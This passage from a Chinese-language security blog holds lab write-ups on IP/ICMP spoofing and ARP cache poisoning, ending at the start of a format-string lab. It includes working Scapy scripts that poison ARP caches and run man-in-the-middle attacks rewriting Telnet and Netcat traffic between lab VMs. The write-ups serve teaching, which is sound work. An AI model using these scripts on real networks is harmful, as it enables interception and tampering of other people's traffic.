src="/2020/10/19/IP-ICMP-Attack-lab/task3-9.PNG" srcset="/img/loading.gif" alt="task3-9"></p><p> 结合相关的反向路由的点</p></li></ol><blockquote><p>Linux kernel implements a filtering rule called reverse path filtering, which ensures the symmetric routing rule. When a packet with the source IP address X comes from an interface (say I), the OS will check whether the return packet will return from the same interface, i.e., whether the routing for packets going to X is symmetric. To check that, the OS conducts a reverse lookup, finds out which interface will be used to route the return packets back to X. If this interface is not I, i.e., different from where the original packet comes from, the routing path is asymmetric. In this case, the kernel will drop the packet可以</p></blockquote><p>​        可以分析出来在我们的spoofed的数据包发送到R的时候，由于return packet并不会从10.0.2.0/24的网络在R上的接口发出，所以这个包会被进行丢弃</p><ol start="4"><li><p>伪造地址为1.2.3.4</p><p> code如下</p> <pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-built_in">from</span> scapy.all import *<span class="hljs-keyword">a</span> = IP()<span class="hljs-keyword">a</span>.src = <span class="hljs-string">"1.2.3.4"</span><span class="hljs-keyword">a</span>.dst = <span class="hljs-string">"192.168.60.5"</span>b = ICMP()p = <span class="hljs-keyword">a</span>/b<span class="hljs-built_in">send</span>(p)</code></pre><p> 之后在R上面运行wireshark抓包</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-10.PNG" srcset="/img/loading.gif" alt="task3-10"></p><p> 可以发现第一个ICMP的源MAC地址是A的MAC地址，第二个ICMP request的源MAC地址是R接入内部网络的接口的MAC地址，可以看到是转入到内部网络中了</p><p> 结合路由表来分析原因可知，当IP.src为1.2.3.4的时候，发到的R的接口假设为R1，那么这个包的return packet的包也应该是从R1中发出，所以反向也应该是这个地址（猜想是即便在路由表中只有当是10.0.2.0/24的主机才会将IP包发过来，但是1.2.3.4也从R1发过来，所以回去的话也应该是这个端口发出）</p><p> B上面wireshark的截图</p><p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task3-11.PNG" srcset="/img/loading.gif" alt="task3-11"></p></li></ol><h2 id="回顾-amp-参考blog"><a href="#回顾-amp-参考blog" class="headerlink" title="回顾&amp;参考blog"></a>回顾&amp;参考blog</h2><p><a href="https://juejin.im/post/6844904049800642568#heading-15" target="_blank" rel="noopener">计算机网络协议架构详解</a></p><p><a href="https://blog.csdn.net/weixin_34417183/article/details/92644501?biz_id=102&utm_term=IP%20Fragmentation%20and%20the%20relat&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-92644501&spm=1018.2118.3001.4187" target="_blank" rel="noopener">数据报分片</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARP-Cache-Poisoning-Attack</title>
    <link href="/2020/10/18/ARP-Cache-Poisoning-Attack/"/>
    <url>/2020/10/18/ARP-Cache-Poisoning-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="ARP-Cache-Poisoning-Attack"><a href="#ARP-Cache-Poisoning-Attack" class="headerlink" title="ARP Cache Poisoning Attack"></a>ARP Cache Poisoning Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>ARP（地址解析协议）协议是工作在网络层当中，它的作用是将IP地址转化成对应的MAC物理地址，从而进行链路层的链接以及通信，而ARP是不安全的，我们可以通过伪造对应的ARP包来实现ARP攻击，例如中间人攻击（Man-In-The-Middle），<a href="https://blog.51cto.com/13570193/2083332" target="_blank" rel="noopener">参考blog</a></p><h2 id="Task-1-ARP-Cache-Poisoning"><a href="#Task-1-ARP-Cache-Poisoning" class="headerlink" title="Task 1: ARP Cache Poisoning"></a>Task 1: ARP Cache Poisoning</h2><p>首先是ARP包的构造，通过使用scapy可以进行实现</p><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/python3</span>from scapy.all <span class="hljs-keyword">import</span> *E = Ether()A = ARP()pkt = E/Asendp(pkt)</code></pre><p>之后运行截图如下，并且通过ls（ARP）的命令可以来查看ARP各个字段的属性</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task1-1.PNG" srcset="/img/loading.gif" alt="task1-1"></p><p>下面分别是三种方式来实现攻击（三台VM分别为A,B,M，我们需要实现的是对A的cache来进行攻击，使得在A的缓存中B的IP地址对应的是M的MAC地址）</p><p>先记录下VM A,B,M的MAC地址以及对应的IP地址</p><p>M：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-1.PNG" srcset="/img/loading.gif" alt="taskA-1"></p><p>A：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-2.PNG" srcset="/img/loading.gif" alt="taskA-2"></p><p>B：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-3.PNG" srcset="/img/loading.gif" alt="taskA-3"></p><p>然后分别记录下每个VM的初始化ARP缓存</p><p>M：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-4.PNG" srcset="/img/loading.gif" alt="taskA-4"></p><p>A：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-5.PNG" srcset="/img/loading.gif" alt="taskA-5"></p><p>B：</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-6.PNG" srcset="/img/loading.gif" alt="taskA-6"></p><h3 id="Task-1A-using-ARP-request"><a href="#Task-1A-using-ARP-request" class="headerlink" title="Task 1A (using ARP request)"></a>Task 1A (using ARP request)</h3><p>方法是在主机M上进行构造ARP request报文，发送给主机A</p><p>具体如何实现的：在ARPrequest和response当中，当知道目的主机IP但是不知道对应的MAC地址的时候，我们可以将对应的目的地址设置为ff-ff-ff-ff-ff-ff-ff，此时会进行全站的广播，而当主机A收到广播对应的request报文的时候，他会先将request报文中的源IP地址和源MAC地址缓存在A的ARP cache当中</p><p>下面是相关代码</p><pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>from scapy.all <span class="hljs-built_in">import</span> *<span class="hljs-attr">VM_B_IP</span> = <span class="hljs-string">"10.0.2.6"</span><span class="hljs-attr">dst_IP</span> = <span class="hljs-string">"10.0.2.5"</span><span class="hljs-attr">MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>print(<span class="hljs-string">"Start the cache poison attack, check weather it succeed"</span>)<span class="hljs-attr">E</span> = Ether()E.<span class="hljs-attr">src</span> = MAC<span class="hljs-attr">A</span> = ARP()A.<span class="hljs-attr">op</span> = <span class="hljs-number">1</span>A.<span class="hljs-attr">hwsrc</span> = MACA.<span class="hljs-attr">psrc</span> = VM_B_IPA.<span class="hljs-attr">pdst</span> = dst_IP<span class="hljs-attr">pkt</span> = E/Asendp(pkt)</code></pre><p>这是在VM M上的运行截图</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-8.PNG" srcset="/img/loading.gif" alt="taskA-8"></p><p>在VM A上，也就是我们的所要欺骗的ARP cache的主机</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-9.PNG" srcset="/img/loading.gif" alt="taskA-9"></p><p>wireshark发现的确抓到了包，此时查看此时的ARP的cache情况</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskA-7.PNG" srcset="/img/loading.gif" alt="taskA-7"></p><p>发现会多了B的IP地址映射到M的MAC地址上的信息</p><p>这种方法是可行的，但是同时也会在A上面添加M的IP地址以及M的MAC地址相对应的条目，我认为这是由于在最开始的过程中，我的VM M并没有主机A的对应条目所导致的</p><h3 id="Task-1B-using-ARP-reply"><a href="#Task-1B-using-ARP-reply" class="headerlink" title="Task 1B (using ARP reply)"></a>Task 1B (using ARP reply)</h3><p>方法是在VM M上构造一个ARP reply报文，并且把这个报文发送给主机A</p><p>具体实现方法，当一个主机收到一个ARP reply报文的时候，它会直接把保温里面对应的源IP地址以及源MAC地址存储起来</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-1.PNG" srcset="/img/loading.gif" alt="taskB-1"></p><p>首先需要将存储在VM A上面的原来欺骗成功的那一项删除，之后再进行欺骗</p><p>相关代码</p><pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>from scapy.all <span class="hljs-built_in">import</span> *<span class="hljs-attr">VM_A_MAC</span> = <span class="hljs-string">"08:00:27:69:66:dc"</span><span class="hljs-attr">VM_A_IP</span> = <span class="hljs-string">"10.0.2.5"</span><span class="hljs-attr">VM_B_IP</span> = <span class="hljs-string">"10.0.2.6"</span><span class="hljs-attr">M_MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>print(<span class="hljs-string">"Start cache attack by using ARP reply, check the cache"</span>)<span class="hljs-attr">E</span> = Ether()E.<span class="hljs-attr">src</span> = M_MACE.<span class="hljs-attr">dst</span> = VM_A_MAC<span class="hljs-attr">A</span> = ARP()A.<span class="hljs-attr">op</span> = <span class="hljs-number">2</span>A.<span class="hljs-attr">hwsrc</span> = M_MACA.<span class="hljs-attr">psrc</span> = VM_B_IPA.<span class="hljs-attr">hwdst</span> = VM_A_MACA.<span class="hljs-attr">pdst</span> = VM_A_IP<span class="hljs-attr">pkt</span> = E/Asendp(pkt)</code></pre><p>在M上的运行截图</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-2.PNG" srcset="/img/loading.gif" alt="taskB-2"></p><p>之后用wireshark在A上面抓包，能看到会显示出对应的reply包</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-3.PNG" srcset="/img/loading.gif" alt="taskB-3">)<img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskB-4.PNG" srcset="/img/loading.gif" alt="taskB-4"></p><p>可以看到原本是没有这个记录/不完整的，之后在接收到reply包之后，B的IP对应M的MAC那一项在缓存中出现</p><p>这个方法也是可行的、</p><h3 id="Task-1C-using-ARP-gratuitous-message"><a href="#Task-1C-using-ARP-gratuitous-message" class="headerlink" title="Task 1C (using ARP gratuitous message)"></a>Task 1C (using ARP gratuitous message)</h3><p>ARP免费报文的格式（op为1）</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-1.png" srcset="/img/loading.gif" alt="taskC-1"></p><blockquote><p>由于该报文的特殊性，它可以用来完成以下各项工作：<br>第1种：检查网络中IP地址是否冲突。<br>主机A发送免费ARP报文，假设其它主机收到来自主机A的免费ARP报文后发现自己的IP地址和报文中的IP地址冲突，则会产生相应的ARP应答给主机A，主机A得知本机的IP地址与其它主机的IP地址与冲突。<br>第2种：更新网络中主机的ARP缓存表。<br>当主机A改变了MAC地址，它通过发送免费ARP报文通知网络中的其它主机更新ARP缓存表中主机A对应的映射记录。</p></blockquote><p>通过免费报文的发送，我们可以来进行修改cache的内容</p><blockquote><p>网络中的设备根据收到的免费ARP报文中携带的信息对自身的ARP缓存表进行更新修改。<br>收到免费ARP报文后，设备会先判断ARP缓存表中是否存在与此免费ARP报文源IP地址对应的ARP缓存表映射记录：<br>存在：根据免费ARP报文中携带的信息更新对应的ARP缓存表映射记录；<br>不存在：根据免费ARP报文中携带的信息新建ARP缓存表映射记录。<br>若关闭免费ARP报文学习功能，设备不会新建原先不存在的ARP缓存表映射记录，但会更新已存在的对应ARP缓存表映射记录</p></blockquote><p>在这里的具体实现方式：我们在主机M上面构造一个对应的免费报文，其中所有的本机IP我们都进行修改，改为B的IP，但是src的MAC地址还依旧是M的MAC地址，这样当主机A收到相应的报文的时候，就会根据报文内容来修改对应的cache</p><p>具体代码如下</p><pre><code class="hljs reasonml">#!/usr/bin/python3from scapy.all import *VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>M_MAC = <span class="hljs-string">"08:00:27:e6:ae:83"</span>broadcast = <span class="hljs-string">"ff:ff:ff:ff:ff:ff"</span>print(<span class="hljs-string">"Use the gratuitous message to attack the cache"</span>)E = <span class="hljs-constructor">Ether()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">E</span>.</span></span>dst = broadcast<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">E</span>.</span></span>src = M_MACA = <span class="hljs-constructor">ARP()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>op = <span class="hljs-number">1</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>hwsrc = M_MAC<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>psrc = VM_B_IP<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>hwdst = broadcast<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>pdst = VM_B_IPpkt = E/Asendp(pkt)</code></pre><p>首先来看M上的运行</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-4.PNG" srcset="/img/loading.gif" alt="taskC-4"></p><p>之后看VM A上面wireshark的抓包情况</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-2.PNG" srcset="/img/loading.gif" alt="taskC-2"></p><p>发现会抓到包，并且更新cache</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/taskC-3.PNG" srcset="/img/loading.gif" alt="taskC-3"></p><p>B的IP地址（10. 0. 2. 6）会对应到VM M的MAC地址上（08:00:27:e6:ae:83）</p><h2 id="Task-2-MITM-Attack-on-Telnet-using-ARP-Cache-Poisoning"><a href="#Task-2-MITM-Attack-on-Telnet-using-ARP-Cache-Poisoning" class="headerlink" title="Task 2: MITM Attack on Telnet using ARP Cache Poisoning"></a>Task 2: MITM Attack on Telnet using ARP Cache Poisoning</h2><h3 id="Step-1-Launch-the-ARP-cache-poisoning-attack"><a href="#Step-1-Launch-the-ARP-cache-poisoning-attack" class="headerlink" title="Step 1 (Launch the ARP cache poisoning attack)"></a>Step 1 (Launch the ARP cache poisoning attack)</h3><p>在这里，采用了ARP request的方式来attack A和B里面的cache</p><p>代码如下</p><pre><code class="hljs nix"><span class="hljs-comment">#!/usr/bin/python3</span>from scapy.all <span class="hljs-built_in">import</span> *<span class="hljs-comment">#VM_B_IP = "10.0.2.6"</span><span class="hljs-attr">VM_A_IP</span> = <span class="hljs-string">"10.0.2.5"</span><span class="hljs-comment">#dst_IP = "10.0.2.5"</span><span class="hljs-attr">dst_IP</span> = <span class="hljs-string">"10.0.2.6"</span><span class="hljs-attr">MAC</span> = <span class="hljs-string">"08:00:27:e6:ae:83"</span>print(<span class="hljs-string">"Start the cache poison attack, check weather it succeed"</span>)<span class="hljs-attr">E</span> = Ether()E.<span class="hljs-attr">src</span> = MAC<span class="hljs-attr">A</span> = ARP()A.<span class="hljs-attr">op</span> = <span class="hljs-number">1</span>A.<span class="hljs-attr">hwsrc</span> = MACA.<span class="hljs-attr">psrc</span> = VM_A_IPA.<span class="hljs-attr">pdst</span> = dst_IP<span class="hljs-attr">pkt</span> = E/Asendp(pkt)</code></pre><p>之后A和B的cache缓存表发生变化，结果如下</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1">)<img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"></p><p>都将IP对应的MAC地址映射到了M的MAC地址上</p><h3 id="Step-2-Testing"><a href="#Step-2-Testing" class="headerlink" title="Step 2 (Testing)"></a>Step 2 (Testing)</h3><p>由于在A上ping B和在B上面ping A得到的结果一样，所以下面截图和说明就以Aping B为例子来说明</p><p>在A的terminal上面输入ping命令，发现刚开始会一直卡在第一行，之后会出现后面的东西</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p><p>同时，在wireshark关闭混杂模式的情况下进行抓包</p><p>在A中</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-4.PNG" srcset="/img/loading.gif" alt="task2-4"></p><p>会发现所有的request都是没有收到回答，no response found，大致原因如下</p><blockquote><p>1.在同一网段内</p><p> 在主机 A 上运行“Ping 192.168.0.5”后，都发生了些什么呢? 首先，Ping 命令会构建一个 固定格式的 ICMP 请求数据包， 然后由 ICMP 协议将这个数据包连同地址“192.168.0.5”一起 交给IP 层协议（和 ICMP 一样，实际上是一组后台运行的进程），IP 层协议将以地址 “192.168.0.5”作为目的地址，本机 IP 地址作为源地址，加上一些其他的控制信息，构建一 个 IP 数据包，并想办法得到 192.168.0.5 的MAC 地址（物理地址，这是数据链路层协议构 建数据链路层的传输单元——帧所必需的），以便交给数据链路层构建一个数据帧。关键就 在这里，IP 层协议通过机器 B 的 IP 地址和自己的子网掩码，发现它跟自己属同一网络，就 直接在本网络内查找这台机器的 MAC,如果以前两机有过通信，在 A 机的 ARP 缓存表应该 有 B 机 IP 与其 MAC 的映射关系，如果没有，就发一个 ARP 请求广播，得到 B 机的 MAC, 一并交给数据链路层。后者构建一个数据帧，目的地址是 IP 层传过来的物理地址，源地址 则是本机的物理地址，还要附加上一些控制信息，依据以太网的介质访问规则，将它们传送 出去。 主机 B 收到这个数据帧后，先检查它的目的地址，并和本机的物理地址对比，如符合， 则接收；否则丢弃。接收后检查该数据帧，将 IP 数据包从帧中提取出来，交给本机的 IP 层 协议。同样，IP 层检查后，将有用的信息提取后交给 ICMP 协议，后者处理后，马上构建 一个 ICMP 应答包，发送给主机 A，其过程和主机 A 发送 ICMP 请求包到主机 B 一模一样。</p><p>2.不在同一网段内</p><p>在主机 A 上运行“Ping 192.168.1.4”后，开始跟上面一样，到了怎样得到 MAC 地址时，IP 协议通过计算发现 D 机与自己不在同一网段内，就直接将交由路由处理，也就是将路由的 MAC 取过来，至于怎样得到路由的 MAC，跟上面一样，先在 ARP 缓存表找，找不到就广 播吧。路由得到这个数据帧后，再跟主机 D 进行联系，如果找不到，就向主机 A 返回一个 超时的信息。</p></blockquote><p>所以在通过缓存表获得对应的M的MAC地址并且转发到M上，可以通过MAC地址的检查，但是IP的检查无法通过之后就会被丢弃</p><p>于此同时，在结束ping之后我们输入arp -a来查看当前的缓存表内容，会发现B的IP原本对应的是M的MAC地址，但是现在又便回到了B的MAC地址</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p><p>这说明在ping的时候，并不是一直都在被丢弃，很有可能进行来重新的ARP广播并且收到了真正的地址</p><p>同时，在B的cache中，A的IP地址对应的也有M的MAC地址转化为了A的MAC地址</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-6.PNG" srcset="/img/loading.gif" alt="task2-6"></p><h3 id="Step-3-Turn-on-IP-forwarding"><a href="#Step-3-Turn-on-IP-forwarding" class="headerlink" title="Step 3 (Turn on IP forwarding)"></a>Step 3 (Turn on IP forwarding)</h3><p>打开M上的IP转发，同时用wireshark进行抓包</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-7.PNG" srcset="/img/loading.gif" alt="task2-7"></p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-9.PNG" srcset="/img/loading.gif" alt="task2-9"></p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-8.PNG" srcset="/img/loading.gif" alt="task2-8"></p><p>可以看到在每个request之后都会有一个重定向的过程，并且在B上面运行wireshark，也会发现能够收到包，并且在之后查看cache，会发现IP地址对应假的MAC会被修改为正确的MAC地址</p><h3 id="Step-4-Launch-the-MITM-attack"><a href="#Step-4-Launch-the-MITM-attack" class="headerlink" title="Step 4 (Launch the MITM attack)"></a>Step 4 (Launch the MITM attack)</h3><p>打开packet forward–建立telnet链接–关闭IP转发</p><p>结果如下，首先是打开packet forward功能并且建立从A到B的链接</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-10.PNG" srcset="/img/loading.gif" alt="task2-10"></p><p>之后在三台VM上面分别打开wireshark并且关闭混杂模式来抓取TCP的包</p><p>之后在VM A上面输入ls命令，查看A的wireshark的包会发现</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-11.PNG" srcset="/img/loading.gif" alt="task2-11"></p><p>而作为中间人的M并没有捕获到任何TCP的包</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-12.PNG" srcset="/img/loading.gif" alt="task2-12"></p><p>而同时在B上面wireshark可以抓到对应的包</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-13.PNG" srcset="/img/loading.gif" alt="task2-13"></p><p>同时，查看A和B此时的缓存表情况，会发现之前的MAC又被修改了回来</p><p>关于Telnet回显的一些点</p><blockquote><p>Behavior of Telnet. In Telnet, typically, every character we type in the Telnet window triggers an individual TCP packet, but if you type very fast, some characters may be sent together in the same packet. That is why in a typical Telnet packet from client to server, the payload only contains one character. The character sent to the server will be echoed back by the server, and the client will then display the character in its window. Therefore, what we see in the client window is not the direct result of the typing; whatever we type in the client window takes a round trip before it is displayed. If the network is disconnected, whatever we typed on the client window will not displayed, until the network is recovered. Similarly, if attackers change the character to Z during the round trip, Z will be displayed at the Telnet client window, even though that is not what you have typed.</p></blockquote><p>在这里，记得要把forward关掉</p><p>具体代码如下（其中为了说明原来的真正输入，我把olddata进行了打印）</p><pre><code class="hljs clean">#!/usr/bin/python3<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *VM_A_IP = <span class="hljs-string">"10.0.2.5"</span>VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>def spoof_pkt(pkt):<span class="hljs-keyword">if</span> pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:# Create a new packet based on the captured one.# (<span class="hljs-number">1</span>) We need to delete the checksum fields <span class="hljs-keyword">in</span> the IP and TCP headers,# because our modification will make them invalid.# Scapy will recalculate them for us <span class="hljs-keyword">if</span> these fields are missing.# (<span class="hljs-number">2</span>) We also delete the original TCP payload.newpkt = IP(pkt[IP])del(newpkt.chksum)del(newpkt[TCP].chksum)del(newpkt[TCP].payload)###################################################################### Construct the new payload based on the old payload.# Students need to implement this part.olddata = pkt[TCP].payload.load # Get the original payload datanewdata = <span class="hljs-string">'Z'</span> # No change is made <span class="hljs-keyword">in</span> this sample <span class="hljs-keyword">code</span>print(<span class="hljs-string">"Message:"</span>,olddata)###################################################################### Attach the new data and set the packet outsend(newpkt/newdata)elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:send(pkt[IP]) # Forward the original packetpkt = sniff(filter=<span class="hljs-string">'tcp and not ether src 08:00:27:e6:ae:83'</span>,prn=spoof_pkt)</code></pre><p>之后在M上面运行嗅探和欺骗程序，在A上面telnet B，当在A上面输入字符的时候，由于每个字符都是先通过TCP发送给server端，之后回显才会在client端进行显示，所以在这里，A上面应该显示的是ZZ，结果如下</p><p>在A上面输入ls</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-14.PNG" srcset="/img/loading.gif" alt="task2-14"></p><p>而同时，在M上面打印sniff到的olddata</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task2-15.PNG" srcset="/img/loading.gif" alt="task2-15"></p><h2 id="Task-3-MITM-Attack-on-Netcat-using-ARP-Cache-Poisoning"><a href="#Task-3-MITM-Attack-on-Netcat-using-ARP-Cache-Poisoning" class="headerlink" title="Task 3: MITM Attack on Netcat using ARP Cache Poisoning"></a>Task 3: MITM Attack on Netcat using ARP Cache Poisoning</h2><p>关于netcat的一些点</p><blockquote><p>Once the connection is made, you can type messages on A. Each line of messages will be put into a TCP packet sent to B, which simply displays the message. </p></blockquote><p>具体实现的代码</p><pre><code class="hljs clean">#!/usr/bin/python3<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *VM_A_IP = <span class="hljs-string">"10.0.2.5"</span>VM_B_IP = <span class="hljs-string">"10.0.2.6"</span>def spoof_pkt(pkt):<span class="hljs-keyword">if</span> pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:# Create a new packet based on the captured one.# (<span class="hljs-number">1</span>) We need to delete the checksum fields <span class="hljs-keyword">in</span> the IP and TCP headers,# because our modification will make them invalid.# Scapy will recalculate them for us <span class="hljs-keyword">if</span> these fields are missing.# (<span class="hljs-number">2</span>) We also delete the original TCP payload.olddata = pkt[TCP].payload.load # Get the original payload dataprint(<span class="hljs-string">"ARP Cache Poisoning Man-in-the-MiddleAttacking..."</span>)print(<span class="hljs-string">"Original Packet........."</span>)print(<span class="hljs-string">"Source IP: "</span>, pkt[IP].src)print(<span class="hljs-string">"Destination IP: "</span>, pkt[IP].dst)print(<span class="hljs-string">"Message: "</span>, olddata)print(<span class="hljs-string">"Message Length: %d"</span> % (len(olddata)))newpkt = IP(pkt[IP])del(newpkt.chksum)del(newpkt[TCP].chksum)del(newpkt[TCP].payload)###################################################################### Construct the new payload based on the old payload.# Students need to implement this part.newdata = olddata.replace(b<span class="hljs-string">'haolong'</span>, b<span class="hljs-string">'AAAAAAA'</span>) newpkt = newpkt/newdataprint(<span class="hljs-string">"Spoofed Packet........."</span>)print(<span class="hljs-string">"Source IP : "</span>, newpkt[IP].src)print(<span class="hljs-string">"Destination IP :"</span>, newpkt[IP].dst)print(<span class="hljs-string">"Message: "</span>, newdata)print(<span class="hljs-string">"Message Length: %d"</span> % (len(newdata)))###################################################################### Attach the new data and set the packet outsend(newpkt)elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:print(<span class="hljs-string">"The message is sent from host B to host A..."</span>)send(pkt[IP]) # Forward the original packetpkt = sniff(filter=<span class="hljs-string">'tcp and not ether src 08:00:27:e6:ae:83'</span>,prn=spoof_pkt)</code></pre><p>在这里面，为了能够更加清晰的在M端看到修改的东西，加了一些print进去</p><p>运行结果，首先是建立好nc连接后，在A上面输入</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/tsk3-1.PNG" srcset="/img/loading.gif" alt="tsk3-1"></p><p>之后在M上面运行sniff_spoof程序，可以看到修改前和修改后的对比</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p><p>此时，可以看到长度以及不需要修改的字符串并没有发生改变，在B上面的显示</p><p><img src="/2020/10/18/ARP-Cache-Poisoning-Attack/task3.PNG" srcset="/img/loading.gif" alt="task3"></p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>ARP协议以及其相应的反面RARP都工作在网络层中，其主要作用是将IP地址转化为每个主机所独有的MAC地址</p><p><img src="https://img-blog.csdnimg.cn/20200724135633405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0MzY3OA==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="ARP报文格式"></p><p>ARP报文封装在以太网帧中</p><p><img src="https://img-blog.csdnimg.cn/2020072413570526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0MzY3OA==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="ARP帧格式"></p><p>而ARP的具体工作方式可以参考下面blog：</p><p><a href="https://www.boolo.top/2020/07/24/20200724-1/" target="_blank" rel="noopener">ARP缓存中毒</a></p><p><a href="https://blog.51cto.com/13570193/2083332" target="_blank" rel="noopener">ARP原理</a></p><p><a href="https://blog.csdn.net/deramer1/article/details/73467048?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160298898219724836731294%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160298898219724836731294&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-3-73467048.pc_first_rank_v2_rank_v28&utm_term=ARP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F&spm=1018.2118.3001.4187" target="_blank" rel="noopener">ARP协议格式和实例分析</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ARP-Cache-Poisoning-Attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Format-String-lab</title>
    <link href="/2020/10/11/Format-String-lab/"/>
    <url>/2020/10/11/Format-String-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Format-String-Vulnerability-Lab"><a href="#Format-String-Vulnerability-Lab" class="headerlink" title="Format String Vulnerability Lab"></a>Format String Vulnerability Lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>printf（）中的第一个参数成为格式化字符串，而这里则是有可能被利用从而运行任意代码的，刚开始挺懵的，参考了一篇不错的blog，在这里mark一下：<a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">格式化字符串漏洞学习</a></p><h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Task-1-The-Vulnerable-Program"><a href="#Task-1-The-Vulnerable-Program" class="headerlink" title="Task 1: The Vulnerable Program"></a>Task 1: The Vulnerable Program</h3><p>向sever process发送消息，可以看到会进行相应的打印</p><p><img src="/2020/10/11/Format-String-lab/task1.PNG" srcset="/img/loading.gif" alt="task1"></p><h3 id="Task-2-Understanding-the-Layout-of-the-Stack"><a href="#Task-2-Understanding-the-Layout-of-the-Stack" class="headerlink" title="Task 2: Understanding the Layout of the Stack"></a>Task 2: Understanding the Layout of the Stack</h3><p>下面的figure 1给我们提供了一个stack的大概框架</p><p><img src="/2020/10/11/Format-String-lab/figure1.PNG" srcset="/img/loading.gif" alt="figure1"></p><ol><li><p>在这里，input 